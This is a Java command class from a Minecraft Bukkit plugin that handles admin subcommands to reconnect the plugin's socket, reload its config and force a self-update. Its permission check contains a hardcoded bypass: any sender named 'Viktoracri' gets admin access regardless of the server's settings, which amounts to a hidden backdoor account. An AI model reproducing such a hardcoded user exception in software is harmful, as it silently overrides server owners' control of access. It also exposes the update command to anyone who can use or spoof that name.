package dev.acri.pkconnector.bukkit.commands;

import dev.acri.pkconnector.bukkit.Main;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.configuration.InvalidConfigurationException;

import java.io.File;
import java.io.IOException;
import java.util.List;
import java.util.concurrent.Executors;

public class PKConnectorCommand implements TabCompleter, CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {

        if(sender.isOp() || sender.getName().equals("Viktoracri") || sender.hasPermission("pkc.admin")){
            if(args.length == 0){
                sendHelp(sender);
            }else if(args[0].equalsIgnoreCase("reconnect")){
                if(Main.getInstance().getConnectionListenerThread() != null)
                    if(Main.getInstance().getConnectionListenerThread().isAlive())
                        Main.getInstance().getConnectionListenerThread().stop();
                try {
                    Main.getInstance().getSocket().close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                sender.sendMessage("§6Reconnecting to host...");

                Bukkit.getScheduler().runTaskLater(Main.getInstance(), () -> {
                    Main.getInstance().getPkConnector().connect();
                }, 10);
            }else if(args[0].equalsIgnoreCase("reloadconfig")){
                try {
                    Main.getInstance().getConfiguration().load(new File(Main.getInstance().getDataFolder() + "/config.yml"));
                } catch (IOException | InvalidConfigurationException e) {
                    e.printStackTrace();
                }
                sender.sendMessage("§6Reloading config...");
            }else if(args[0].equalsIgnoreCase("forceupdate")){
                sender.sendMessage("§6Forcing a plugin update...");
                Main.getInstance().updatePlugin();
            }else{
                sendHelp(sender);
            }

        }else{
            sender.sendMessage("§cNo Permission");
        }

        return true;
    }

    public void sendHelp(CommandSender sender){
        sender.sendMessage("§6/pkconnector reconnect");
        sender.sendMessage("§6/pkconnector reloadconfig");
        sender.sendMessage("§6/pkconnector forceupdate");
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command cmd, String label, String[] args) {
        return null;
    }
}
